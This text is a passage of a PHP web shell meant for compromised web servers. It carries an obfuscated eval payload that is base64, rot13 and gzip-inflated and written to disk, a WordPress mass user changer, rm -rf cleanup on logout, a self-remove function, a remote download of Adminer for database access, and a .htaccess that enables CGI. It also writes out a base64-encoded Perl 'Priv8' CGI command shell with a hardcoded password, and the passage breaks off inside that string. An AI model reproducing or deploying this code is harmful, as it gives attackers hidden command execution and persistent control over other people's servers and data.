00L2FURGJQbjZlclExdVFWajBreWlpaEV5eUU4RGdTVDc2RTQwdUR5TXFDdHlrTzRPSU1DV0NMQWNNcWtTOVM0aGp3cmtPa0ZBbWhZZUlnN2w5d0FkNWcvZHZBYVlCMEdJaG9yQlFMTCtzMGduNGpTakhkUEl0T3FGaWdwKzIyS3NpU0xteHMrRTlzY2U1UGIzSEpDNG1pc2hjU0krVlNKL3JOR09vbUVsQ0ZQUkpRY2g4a0JnUStGdUVORnVGcXRRNkxJb01mQ2FHQ2R4VlZ4WWdiVVhiQVNScTFJc2lGQkRFaHlKOEFVQzR6WUE0RG11QVZ3ZXVCU2dPSlkyamFPc2RQME5Wc3B5SlJoSWQxdGMvT1Fadm5QWG5BdHJJL1kzRDluQm5DQ2Ftc1JITkRESGxuZWEvc1UxN2daTmNudnhyd0dMd3MzVUVUNi8zeWxSVVNJc0JRbkRZLzlacExERGNVTGhLREdzRG8zbHozUWREYmtzVENVMktNQ1JDdFFhZlo2eGhFaWJ0dmNtTDBJclVNQUhJNTExbkdOWk5pa1NpWDF6YzMrT1JuR1NjSlBqbU5qS0JjdHYrT1V2Q0hTMXJRQ0xlZGs4NnZQU3dJdC9seDVhTk5VcERVQklqT0NYUENWS2NGTTA2a3NjeUVSV0FRcTN2VjYvNXAybE9iS2hMQkkvWFJtcG1CeVdVTnRtN05rZzIyVUJ5WmdibnN0SDdyYnZmcGtyTlVnVFh2eUFSVnE5ZDZON0ZzcHlVQzM4V21ESE1DcE5XNXdUOGc4UVQvWTNFQVVJYVBnZEF4RURaVmlMTnBzM3ZWZG02OTdNeHFnNGd6cklzNGMyQTYzZTUyRzkzRmFvS0ErdWdPbkJ0T2RyZlFRa3Q2aG40NDh2RVFUUE51cGtndzB5VDh2NUl1NlVteGZmc3R0dWxCc1FCTXpjSy9wWndDb2Q4L085d1cySXl0dlJaZHdUSVlVQSsrSmw2OWpGTUxmK204cEE5TVhFY2dwdy81VUNzZUNRdWgzaWtqTWE0TVlGbGZCSnNCTW00WEF6dWtYazBpTWJUTGJ3WFJMK21Nb0tEM0tBOTJNekIxWkZsU2NGN1JrRGhEUTdBeG9BdUJvVlV5NG4vRkorUENtR3g3YlA0dGZUenVIOElPS24ydTlUOXRvVTdFeGM4Q29pRU5XRGo3bVZrMFhJRVVNL3IyemV0cVJnaVp5cVVmU3ZvQVNMYlVISndacEN0d1ZkT2ljUkxPbkwxeDBqSUNOdXV1R0NTZExNd0lwVmlXVGl4USs1aVhMNU5naGxITFdKbFdNRkNpVGt3ekUxSzZ1Qm1OeU9wZXUzemd1enh4STRka3NsQWczYkpzeXZNNW52bko2UmNNVkJYelBEd0ZUcVlEUFhkVGVDSlhNMDBaODNKbW40cmZMQUF3Vzg3b2lZaUVpWEpxbEJpSzcwZUtGYk5ISmJ2dmxTMmh4azlxNThlcnlqOXd4NWU2bE5qc3p1cStqUEIyOXRKR1VuZ3ZuUzdOZjRyNXhxMWNqSVc1eTIrR1NYaXFCbURWdFpMRzh1SzZidGgwaFZ5WXp5eTJJcHY0T3lMUFZTckg5VU52RnJKMnNLV1NLR1l0bVJwOUVlZmxScVl6Q2hzWklyMFNIRzllem0vcWJuUEorN2toMGRJVTZPeDg2TXhWZFhhMms1U0dQdk5ZK1R5b25CZzlnK1NSamhJeE53Tk5XNkgxMm5iTUZ4cHMvV3B5UjQyQ1ltNWVtSHlwbzYyTzQ0cno0b3Y1Um4xbVdPMHdrTFhXUFQ3a0pHWEYrT2hoTVhMZDFZNFB4MkJ1RXRDRXVsU2p4QmZIbjZndERpMXM5ZmpRNHZDYndkUythTFp0U1pyTmpXeHNWL1BUUmFBbS9DOFp3OExSb3ZEWmIwdlhMYi9XYjk4azZ0SmNTMDdjTEJWSmxqaGJZbGwxOVQwRUw1Wk5STTBJV2szcVczeWVsVjFHU0JaOXRwSnpSVTd2a0pKSGF4RU5KVFFBM3RVSUR5UVFuRmduTE9UKzdydFFkVzBTVlhESFZ5QTUyUzQvbGxFZ3RvUWtTU1BEUUI0a1kyZEhsL2ZxeEtVRE9INW1RNWVPREZTdkR3N3FBSmJMcGNUSUdoN1NxS2xXU0ExSFVYRW1xWlh6MDl4VVJhVGN4SWROcm96elhWcWZnaWlaZFcyWDRKd3dZcGpJS3dPWkNkK1R0ejhlT0E4ZjRGTWs0bGJrd1kzWEI2QzBSWmJxT2ZsN0RxRUhOOEMzQzBZVE9EbTA5SUt5R0dZa01wQ25OTC9DVEFXaXpQT0JycVdQaUtZdmtTNEtTbndEQnBEOW9nNVZpZXRWT2tWVG5SdnZNTFloaVJOaTZDaHRmNVRHMG1BNVlBdFo3WDMvdldjQXl3dmxQKzdVcWZUMlBaR2ZqLzhMIjsKZXZhbChzdHJfcm90MTMoZ3ppbmZsYXRlKHN0cl9yb3QxMyhiYXNlNjRfZGVjb2RlKCgkaGV4KSkpKSkpOyA=";
        $mass = fopen($file_mass, "w");
        fwrite($mass, base64_decode($mass_script));
        echo "<br><center>  <iframe src='priv_sym/conf.php' width='900' height='480'></iframe></a>";
        echo '</div>';
        hardFooter();
}
function actionEdituser() {
        hardHeader();
        echo "<center><h1>Wordpress Mass User Changer</h1><div class=content><br>";
        echo "<br><center>  <iframe src='?user' width='900' height='400'></iframe></a>";
        echo '</div>';
        hardFooter();
}
function actionLogout() {
        exec("rm -rf priv_sym priv_cgi adminer.php");
    setcookie(md5($_SERVER['HTTP_HOST']), '', time() - 3600);
        die("<style>
        body {background-color:#000000; background-image:url('https://i.imgur.com/hLcQCBx.gif'); } </style></br></br><body><pre align=center><form method=post style='color:#ffffff;text-align: center;'>Bye -,-<br><br></form> </body>");
}
function actionSelfRemove() {
        if($_POST['p1'] == 'yes')
                if(@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__)))
                        die('Shell has been removed');
                else
                        echo 'unlink error!';
    if($_POST['p1'] != 'yes')
        hardHeader();
        echo '<h1>Suicide</h1><div class=content>Really want to remove the shell?<br><a href=# onclick="g(null,null,\'yes\')">Yes</a></div>';
        hardFooter();
}


function actionAdminer() {
        hardHeader();
        echo "<center><h1>Adminer</h1><div class=content><br>";
        $full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
        function adminer($url, $isi) {
                $fp = fopen($isi, "w");
                $ch = curl_init();
                          curl_setopt($ch, CURLOPT_URL, $url);
                          curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
                          curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                          curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                          curl_setopt($ch, CURLOPT_FILE, $fp);
                return curl_exec($ch);
                          curl_close($ch);
                fclose($fp);
                ob_flush();
                flush();
        }
        if(file_exists('adminer.php')) {
                echo "<center><font color=white><br><br><a href='adminer.php' target='_blank'>[ Adminer login ]</a><br><br><br></font></center>";
        } else {
                if(adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php","adminer.php")) {
                        echo "<center><font color=white><br><br><a href='adminer.php' target='_blank'>[ Adminer login ]</a><br><br></font></center>";
                } else {
                        echo "<center><font color=red>Failed to create Adminer file</font></center>";
                }
        }
        hardFooter();
}
function actionBruteforce() {
        hardHeader();
        echo "<center><h1>Cgi Telnet</h1><div class=content><br>";
        $cgi_dir = mkdir('priv_cgi', 0755);
        chdir('priv_cgi');
        $file_cgi = "cgi.priv";
        $memeg = ".htaccess";
        $isi_htcgi = "OPTIONS Indexes Includes ExecCGI FollowSymLinks \n AddType application/x-httpd-cgi .priv \n AddHandler cgi-script .priv \n AddHandler cgi-script .priv";
        $htcgi = fopen(".htaccess", "w");
        $cgi_script = "IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluCnVzZSBNSU1FOjpCYXNlNjQ7CiRWZXJzaW9uPSAiUFJJVjgtU0hFTEwgVmVyc2lvbiAxLjMiOwokRWRpdFBlcnNpb249Ijxmb250IHN0eWxlPSd0ZXh0LXNoYWRvdzogMHB4IDBweCA2cHggcmdiKDI1NSwgMCwgMCksIDBweCAwcHggNXB4IHJnYigzMDAsIDAsIDApLCAwcHggMHB4IDVweCByZ2IoMzAwLCAwLCAwKTsgY29sb3I6I2ZmZmZmZjsgZm9udC13ZWlnaHQ6Ym9sZDsnPlBSSVY4LVNIRUxMPC9mb250PiI7CgokUGFzc3dvcmQgPSAicHJpdjhzaGVsbCI7CQkJIyBDaGFuZ2UgdGhpcy4gWW91IHdpbGwgbmVlZCB0byBlbnRlciB0aGlzIHRvIGxvZ2luLgpzdWIgSXNfV2luKCl7Cgkkb3MgPSAmdHJpbSgkRU5WeyJTRVJWRVJfU09GVFdBUkUifSk7CglpZigkb3MgPX4gbS93aW4vaSl7CgkJcmV0dXJuIDE7Cgl9CgllbHNlewoJCXJldHVybiAwOwoJfQp9CiRXaW5OVCA9ICZJc19XaW4oKTsJCQkJIyBZb3UgbmVlZCB0byBjaGFuZ2UgdGhlIHZhbHVlIG9mIHRoaXMgdG8gMSBpZgoJCQkJCQkJCSMgeW91J3JlIHJ1bm5pbmcgdGhpcyBzY3JpcHQgb24gYSBXaW5kb3dzIE5UCgkJCQkJCQkJIyBtYWNoaW5lLiBJZiB5b3UncmUgcnVubmluZyBpdCBvbiBVbml4LCB5b3UKCQkJCQkJCQkjIGNhbiBsZWF2ZSB0aGUgdmFsdWUgYXMgaXQgaXMuCgokTlRDbWRTZXAgPSAiJiI7CQkJCSMgVGhpcyBjaGFyYWN0ZXIgaXMgdXNlZCB0byBzZXBlcmF0ZSAyIGNvbW1hbmRzCgkJCQkJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBXaW5kb3dzIE5ULgoKJFVuaXhDbWRTZXAgPSAiOyI7CQkJCSMgVGhpcyBjaGFyYWN0ZXIgaXMgdXNlZCB0byBzZXBlcmF0ZSAyIGNvbW1hbmRzCgkJCQkJCQkJIyBpbiBhIGNvbW1hbmQgbGluZSBvbiBVbml4LgoKJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gPSAxMDAwMDsJIyBUaW1lIGluIHNlY29uZHMgYWZ0ZXIgY29tbWFuZHMgd2lsbCBiZSBraWxsZWQKCQkJCQkJCQkjIERvbid0IHNldCB0aGlzIHRvIGEgdmVyeSBsYXJnZSB2YWx1ZS4gVGhpcyBpcwoJCQkJCQkJCSMgdXNlZnVsIGZvciBjb21tYW5kcyB0aGF0IG1heSBoYW5nIG9yIHRoYXQKCQkJCQkJCQkjIHRha2UgdmVyeSBsb25nIHRvIGV4ZWN1dGUsIGxpa2UgImZpbmQgLyIuCgkJCQkJCQkJIyBUaGlzIGlzIHZhbGlkIG9ubHkgb24gVW5peCBzZXJ2ZXJzLiBJdCBpcwoJCQkJCQkJCSMgaWdub3JlZCBvbiBOVCBTZXJ2ZXJzLgoKJFNob3dEeW5hbWljT3V0cHV0ID0gMTsJCQkjIElmIHRoaXMgaXMgMSwgdGhlbiBkYXRhIGlzIHNlbnQgdG8gdGhlCgkJCQkJCQkJIyBicm93c2VyIGFzIHNvb24gYXMgaXQgaXMgb3V0cHV0LCBvdGhlcndpc2UKCQkJCQkJCQkjIGl0IGlzIGJ1ZmZlcmVkIGFuZCBzZW5kIHdoZW4gdGhlIGNvbW1hbmQKCQkJCQkJCQkjIGNvbXBsZXRlcy4gVGhpcyBpcyB1c2VmdWwgZm9yIGNvbW1hbmRzIGxpa2UKCQkJCQkJCQkjIHBpbmcsIHNvIHRoYXQgeW91IGNhbiBzZWUgdGhlIG91dHB1dCBhcyBpdAoJCQkJCQkJCSMgaXMgYmVpbmcgZ2VuZXJhdGVkLgoKIyBET04nVCBDSEFOR0UgQU5ZVEhJTkcgQkVMT1cgVEhJUyBMSU5FIFVOTEVTUyBZT1UgS05PVyBXSEFUIFlPVSdSRSBET0lORyAhIQoKJENtZFNlcCA9ICgkV2luTlQgPyAkTlRDbWRTZXAgOiAkVW5peENtZFNlcCk7CiRDbWRQd2QgPSAoJFdpbk5UID8gImNkIiA6ICJwd2QiKTsKJFBhdGhTZXAgPSAoJFdpbk5UID8gIlxcIiA6ICIvIik7CiRSZWRpcmVjdG9yID0gKCRXaW5OVCA/ICIgMj4mMSAxPiYyIiA6ICIgMT4mMSAyPiYxIik7CiRjb2xzPSAxNTA7CiRyb3dzPSAyNjsKIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIFJlYWRzIHRoZSBpbnB1dCBzZW50IGJ5IHRoZSBicm93c2VyIGFuZCBwYXJzZXMgdGhlIGlucHV0IHZhcmlhYmxlcy4gSXQKIyBwYXJzZXMgR0VULCBQT1NUIGFuZCBtdWx0aXBhcnQvZm9ybS1kYXRhIHRoYXQgaXMgdXNlZCBmb3IgdXBsb2FkaW5nIGZpbGVzLgojIFRoZSBmaWxlbmFtZSBpcyBzdG9yZWQgaW4gJGlueydmJ30gYW5kIHRoZSBkYXRhIGlzIHN0b3JlZCBpbiAkaW57J2ZpbGVkYXRhJ30uCiMgT3RoZXIgdmFyaWFibGVzIGNhbiBiZSBhY2Nlc3NlZCB1c2luZyAkaW57J3Zhcid9LCB3aGVyZSB2YXIgaXMgdGhlIG5hbWUgb2YKIyB0aGUgdmFyaWFibGUuIE5vdGU6IE1vc3Qgb2YgdGhlIGNvZGUgaW4gdGhpcyBmdW5jdGlvbiBpcyB0YWtlbiBmcm9tIG90aGVyIENHSQojIHNjcmlwdHMuCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0Kc3ViIFJlYWRQYXJzZSAKewoJbG9jYWwgKCppbikgPSBAXyBpZiBAXzsKCWxvY2FsICgkaSwgJGxvYywgJGtleSwgJHZhbCk7CgkKCSRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOwoKCWlmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIkdFVCIpCgl7CgkJJGluID0gJEVOVnsnUVVFUllfU1RSSU5HJ307Cgl9CgllbHNpZigkRU5WeydSRVFVRVNUX01FVEhPRCd9IGVxICJQT1NUIikKCXsKCQliaW5tb2RlKFNURElOKSBpZiAkTXVsdGlwYXJ0Rm9ybURhdGEgJiAkV2luTlQ7CgkJcmVhZChTVERJTiwgJGluLCAkRU5WeydDT05URU5UX0xFTkdUSCd9KTsKCX0KCgkjIGhhbmRsZSBmaWxlIHVwbG9hZCBkYXRhCglpZigkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLykKCXsKCQkkQm91bmRhcnkgPSAnLS0nLiQxOyAjIHBsZWFzZSByZWZlciB0byBSRkMxODY3IAoJCUBsaXN0ID0gc3BsaXQoLyRCb3VuZGFyeS8sICRpbik7IAoJCSRIZWFkZXJCb2R5ID0gJGxpc3RbMV07CgkJJEhlYWRlckJvZHkgPX4gL1xyXG5cclxufFxuXG4vOwoJCSRIZWFkZXIgPSAkYDsKCQkkQm9keSA9ICQnOwogCQkkQm9keSA9fiBzL1xyXG4kLy87ICMgdGhlIGxhc3QgXHJcbiB3YXMgcHV0IGluIGJ5IE5ldHNjYXBlCgkJJGlueydmaWxlZGF0YSd9ID0gJEJvZHk7CgkJJEhlYWRlciA9fiAvZmlsZW5hbWU9XCIoLispXCIvOyAKCQkkaW57J2YnfSA9ICQxOyAKCQkkaW57J2YnfSA9fiBzL1wiLy9nOwoJCSRpbnsnZid9ID1+IHMvXHMvL2c7CgoJCSMgcGFyc2UgdHJhaWxlcgoJCWZvcigkaT0yOyAkbGlzdFskaV07ICRpKyspCgkJeyAKCQkJJGxpc3RbJGldID1+IHMvXi4rbmFtZT0kLy87CgkJCSRsaXN0WyRpXSA9fiAvXCIoXHcrKVwiLzsKCQkJJGtleSA9ICQxOwoJCQkkdmFsID0gJCc7CgkJCSR2YWwgPX4gcy8oXihcclxuXHJcbnxcblxuKSl8KFxyXG4kfFxuJCkvL2c7CgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7CgkJCSRpbnska2V5fSA9ICR2YWw7IAoJCX0KCX0KCWVsc2UgIyBzdGFuZGFyZCBwb3N0IGRhdGEgKHVybCBlbmNvZGVkLCBub3QgbXVsdGlwYXJ0KQoJewoJCUBpbiA9IHNwbGl0KC8mLywgJGluKTsKCQlmb3JlYWNoICRpICgwIC4uICQjaW4pCgkJewoJCQkkaW5bJGldID1+IHMvXCsvIC9nOwoJCQkoJGtleSwgJHZhbCkgPSBzcGxpdCgvPS8sICRpblskaV0sIDIpOwoJCQkka2V5ID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOwoJCQkkdmFsID1+IHMvJSguLikvcGFjaygiYyIsIGhleCgkMSkpL2dlOwoJCQkkaW57JGtleX0gLj0gIlwwIiBpZiAoZGVmaW5lZCgkaW57JGtleX0pKTsKCQkJJGlueyRrZXl9IC49ICR2YWw7CgkJfQoJfQp9CgojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgUHJpbnRzIHRoZSBIVE1MIFBhZ2UgSGVhZGVyCiMgQXJndW1lbnQgMTogRm9ybSBpdGVtIG5hbWUgdG8gd2hpY2ggZm9jdXMgc2hvdWxkIGJlIHNldAojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCnN1YiBQcmludFBhZ2VIZWFkZXIKewoJJEVuY29kZWRDdXJyZW50RGlyID0gJEN1cnJlbnREaXI7CgkkRW5jb2RlZEN1cnJlbnREaXIgPX4gcy8oW15hLXpBLVowLTldKS8nJScudW5wYWNrKCJIKiIsJDEpL2VnOwoJbXkgJGRpciA9JEN1cnJlbnREaXI7CgkkZGlyPX4gcy9cXC9cXFxcL2c7CglwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsKCXByaW50IDw8RU5EOwo8aHRtbD4KPGhlYWQ+CjxsaW5rIGhyZWY9J2h0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1PcGVuK1NhbnMnIHJlbD0nc3R5bGVzaGVldCc+CjxtZXRhIGh0dHAtZXF1aXY9ImNvbnRlbnQtdHlwZSIgY29udGVudD0idGV4dC9odG1sOyBjaGFyc2V0PVVURi04Ij4KPHRpdGxlPlByaXY4IFNoZWxsIENnaTwvdGl0bGU+CgokSHRtbE1ldGFIZWFkZXIKCjwvaGVhZD4KPHN0eWxlPgpib2R5ewpmb250OiAxMHB0IE9wZW4gU2FuczsKfQp0ciB7CkJPUkRFUi1SSUdIVDogICMzZTNlM2UgMXB4IHNvbGlkOwpCT1JERVItVE9QOiAgICAjM2UzZTNlIDFweCBzb2xpZDsKQk9SREVSLUxFRlQ6ICAgIzNlM2UzZSAxcHggc29saWQ7CkJPUkRFUi1CT1RUT006ICMzZTNlM2UgMXB4IHNvbGlkOwpjb2xvcjogI2ZmZmZmZjsKfQp0ZCB7CkJPUkRFUi1SSUdIVDogICMzZTNlM2UgMXB4IHNvbGlkOwpCT1JERVItVE9QOiAgICAjM2UzZTNlIDFweCBzb2xpZDsKQk9SREVSLUxFRlQ6ICAgIzNlM2UzZSAxcHggc29saWQ7CkJPUkRFUi1CT1RUT006ICMzZTNlM2UgMXB4IHNvbGlkOwpjb2xvcjogI2ZmMTExMTsKZm9udDogMTBwdCBPcGVuIFNhbnM7Cn0KCnRhYmxlIHsKQk9SREVSLVJJR0hUOiAgIzNlM2UzZSAxcHggc29saWQ7CkJPUkRFUi1UT1A6ICAgICMzZTNlM2UgMXB4IHNvbGlkOwpCT1JERVItTEVGVDogICAjM2UzZTNlIDFweCBzb2xpZDsKQk9SREVSLUJPVFRPTTogIzNlM2UzZSAxcHggc29saWQ7CkJBQ0tHUk9VTkQtQ09MT1I6ICMxMTE7Cn0KCgppbnB1dCB7CkJPUkRFUi1SSUdIVDogICMzZTNlM2UgMXB4IHNvbGlkOwpCT1JERVItVE9QOiAgICAjM2UzZTNlIDFweCBzb2xpZDsKQk9SREVSLUxFRlQ6ICAgIzNlM2UzZSAxcHggc29saWQ7CkJPUkRFUi1CT1RUT006ICMzZTNlM2UgMXB4IHNvbGlkOwpCQUNLR1JPVU5ELUNPTE9SOiBCbGFjazsKZm9udDogMTBwdCBPcGVuIFNhbnM7CmNvbG9yOiAjZmZmZmZmOwp9CgppbnB1dC5zdWJtaXQgewp0ZXh0LXNoYWRvdzogMHB0IDBwdCAwLjNlbSBjeWFuLCAwcHQgMHB0IDAuM2VtIGN5YW47CmNvbG9yOiAjRkZGRkZGOwpib3JkZXItY29sb3I6ICNmZjExMTE7Cn0KCmNvZGUgewpib3JkZXIJCQk6IGRhc2hlZCAwcHggIzMzMzsKQkFDS0dST1VORC1DT0xPUjogQmxhY2s7CmZvbnQ6IDEwcHQgT3BlbiBTYW5zIGJvbGQ7CmNvbG9yOiB3aGlsZTsKfQoKcnVuIHsKYm9yZGVyCQkJOiBkYXNoZWQgMHB4ICMzMzM7CmZvbnQ6IDEwcHQgT3BlbiBTYW5zIGJvbGQ7CmNvbG9yOiAjRkYwMEFBOwp9Cgp0ZXh0YXJlYSB7CkJPUkRFUi1SSUdIVDogICMzZTNlM2UgMXB4IHNvbGlkOwpCT1JERVItVE9QOiAgICAjM2UzZTNlIDFweCBzb2xpZDsKQk9SREVSLUxFRlQ6ICAgIzNlM2UzZSAxcHggc29saWQ7CkJPUkRFUi1CT1RUT006ICMzZTNlM2UgMXB4IHNvbGlkOwpCQUNLR1JPVU5ELUNPTE9SOiAjMWIxYjFiOwpmb250OiBGaXhlZHN5cyBib2xkOwpjb2xvcjogI2FhYTsKfQpBOmxpbmsgewoJQ09MT1I6ICNmZjExMTE7IFRFWFQtREVDT1JBVElPTjogbm9uZQp9CkE6dmlzaXRlZCB7CglDT0xPUjogI2ZmMTExMTsgVEVYVC1ERUNPUkFUSU9OOiBub25lCn0KQTpob3ZlciB7Cgl0ZXh0LXNoYWRvdzogMHB0IDBwdCAwLjNlbSBjeWFuLCAwcHQgMHB0IDAuM2VtIGN5YW47Cgljb2xvcjogI2ZmZmZmZjsgVEVYVC1ERUNPUkFUSU9OOiBub25lCn0KQTphY3RpdmUgewoJY29sb3I6IFJlZDsgVEVYVC1ERUNPUkFUSU9OOiBub25lCn0KCi5saXN0ZGlyIHRyOmhvdmVyewoJYmFja2dyb3VuZDogIzQ0NDsKfQoubGlzdGRpciB0cjpob3ZlciB0ZHsKCWJhY2tncm91bmQ6ICM0NDQ7Cgl0ZXh0LXNoYWRvdzogMHB0IDBwdCAwLjNlbSBjeWFuLCAwcHQgMHB0IDAuM2VtIGN5YW47Cgljb2xvcjogI0ZGRkZGRjsgVEVYVC1ERUNPUkFUSU9OOiBub25lOwp9Ci5ub3RsaW5lewoJYmFja2dyb3VuZDogIzExMTsKfQoubGluZXsKCWJhY2tncm91bmQ6ICMyMjI7Cn0KPC9zdHlsZT4KPHNjcmlwdCBsYW5ndWFnZT0iamF2YXNjcmlwdCI+CmZ1bmN0aW9uIGNobW9kX2Zvcm0oaSxmaWxlKQp7CgkvKnZhciBhamF4PSdhamF4X1Bvc3REYXRhKCJGb3JtUGVybXNfJytpKyciLCIkU2NyaXB0TG9jYXRpb24iLCJSZXNwb25zZURhdGEiKTsgcmV0dXJuIGZhbHNlOyc7Ki8KCXZhciBhamF4PSIiOwoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVQZXJtc18iK2kpLmlubmVySFRNTD0iPGZvcm0gbmFtZT1Gb3JtUGVybXNfIiArIGkrICIgYWN0aW9uPScgbWV0aG9kPSdQT1NUJz48aW5wdXQgaWQ9dGV4dF8iICsgaSArICIgIG5hbWU9Y2htb2QgdHlwZT10ZXh0IHNpemU9NSAvPjxpbnB1dCB0eXBlPXN1Ym1pdCBjbGFzcz0nc3VibWl0JyBvbmNsaWNrPSciICsgYWpheCArICInIHZhbHVlPU9LPjxpbnB1dCB0eXBlPWhpZGRlbiBuYW1lPWEgdmFsdWU9J2d1aSc+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZCB2YWx1ZT0nJGRpcic+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9ZiB2YWx1ZT0nIitmaWxlKyInPjwvZm9ybT4iOwoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoInRleHRfIiArIGkpLmZvY3VzKCk7Cn0KZnVuY3Rpb24gcm1fY2htb2RfZm9ybShyZXNwb25zZSxpLHBlcm1zLGZpbGUpCnsKCXJlc3BvbnNlLmlubmVySFRNTCA9ICI8c3BhbiBvbmNsaWNrPVxcXCJjaG1vZF9mb3JtKCIgKyBpICsgIiwnIisgZmlsZSsgIicpXFxcIiA+IisgcGVybXMgKyI8L3NwYW4+PC90ZD4iOwp9CmZ1bmN0aW9uIHJlbmFtZV9mb3JtKGksZmlsZSxmKQp7Cgl2YXIgYWpheD0iIjsKCWYucmVwbGFjZSgvXFxcXC9nLCJcXFxcXFxcXCIpOwoJdmFyIGJhY2s9InJtX3JlbmFtZV9mb3JtKCIraSsiLFxcXCIiK2ZpbGUrIlxcXCIsXFxcIiIrZisiXFxcIik7IHJldHVybiBmYWxzZTsiOwoJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIkZpbGVfIitpKS5pbm5lckhUTUw9Ijxmb3JtIG5hbWU9Rm9ybVBlcm1zXyIgKyBpKyAiIGFjdGlvbj0nIG1ldGhvZD0nUE9TVCc+PGlucHV0IGlkPXRleHRfIiArIGkgKyAiICBuYW1lPXJlbmFtZSB0eXBlPXRleHQgdmFsdWU9ICciK2ZpbGUrIicgLz48aW5wdXQgdHlwZT1zdWJtaXQgY2xhc3M9J3N1Ym1pdCcgb25jbGljaz0nIiArIGFqYXggKyAiJyB2YWx1ZT1PSz48aW5wdXQgdHlwZT1zdWJtaXQgY2xhc3M9J3N1Ym1pdCcgb25jbGljaz0nIiArIGJhY2sgKyAiJyB2YWx1ZT1DYW5jZWw+PGlucHV0IHR5cGU9aGlkZGVuIG5hbWU9YSB2YWx1ZT0nZ3VpJz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1kIHZhbHVlPSckZGlyJz48aW5wdXQgdHlwZT1oaWRkZW4gbmFtZT1mIHZhbHVlPSciK2ZpbGUrIic+PC9mb3JtPiI7Cglkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgidGV4dF8iICsgaSkuZm9jdXMoKTsKfQpmdW5jdGlvbiBybV9yZW5hbWVfZm9ybShpLGZpbGUsZikKewoJaWYoZj09J2YnKQoJewoJCWRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJGaWxlXyIraSkuaW5uZXJIVE1MPSI8YSBocmVmPSc/YT1jb21tYW5kJmQ9JGRpciZjPWVkaXQlMjAiK2ZpbGUrIiUyMCc+IiArZmlsZSsgIjwvYT4iOwoJfWVsc2UKCXsKCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiRmlsZV8iK2kpLmlubmVySFRNTD0iPGEgaHJlZj0nP2E9Z3VpJmQ9IitmKyInPlsgIiArZmlsZSsgIiBdPC9hPiI7Cgl9Cn0KPC9zY3JpcHQ+CjxzdHlsZT4KYm9keSB7YmFja2dyb3VuZC1jb2xvcjojMDAwMDAwOyBjb2xvcjojZTFlMWUxOyBtYXJnaW46MDsgZm9udDpub3JtYWwgNzUlIE9wZW4gU2Fucywgc2Fucy1zZXJpZjsgYmFja2dyb3VuZC1pbWFnZTp1cmwoJ2h0dHBzOi8vaS5pbWd1ci5jb20vaExjUUNCeC5naWYnKTsgfSA8L3N0eWxlPgo8Ym9keSBvbkxvYWQ9ImRvY3VtZW50LmYuQF8uZm9jdXMoKSIgIHRvcG1hcmdpbj0iMCIgbGVmdG1hcmdpbj0iMCIgbWFyZ2lud2lkdGg9IjAiIG1hcmdpbmhlaWdodD0iMCI+CjxjZW50ZXI+PGNvZGU+Cjx0YWJsZSBib3JkZXI9IjEiIHdpZHRoPSIxMDAlIiBjZWxsc3BhY2luZz0iMCIgY2VsbHBhZGRpbmc9IjIiPgo8dHI+Cgk8dGQgYWxpZ249ImNlbnRlciIgcm93c3Bhbj0yPgoJCTxiPjxmb250IHNpemU9IjUiPiRFZGl0UGVyc2lvbjwvZm9udD48L2I+Cgk8L3RkPgoKCTx0ZD4KCgkJPGZvbnQgZmFjZT0iT3BlbiBTYW5zIiBzaXplPSIyIj4kRU5WeyJTRVJWRVJfU09GVFdBUkUifTwvZm9udD4KCTwvdGQ+Cgk8dGQ+U2VydmVyIElQOjxmb250IGNvbG9yPSIjZmZmZmZmIj4gJEVOVnsnU0VSVkVSX0FERFInfTwvZm9udD4gfCBZb3VyIElQOiA8Zm9udCBjb2xvcj0iI2ZmZmZmZiI+JEVOVnsnUkVNT1RFX0FERFInfTwvZm9udD4KCTwvdGQ+Cgo8L3RyPgoKPHRyPgo8dGQgY29sc3Bhbj0iMyI+PGZvbnQgZmFjZT0iT3BlbiBTYW5zIiBzaXplPSIyIj4KPGEgaHJlZj0iJFNjcmlwdExvY2F0aW9uIj5Ib21lPC9hPiB8IAo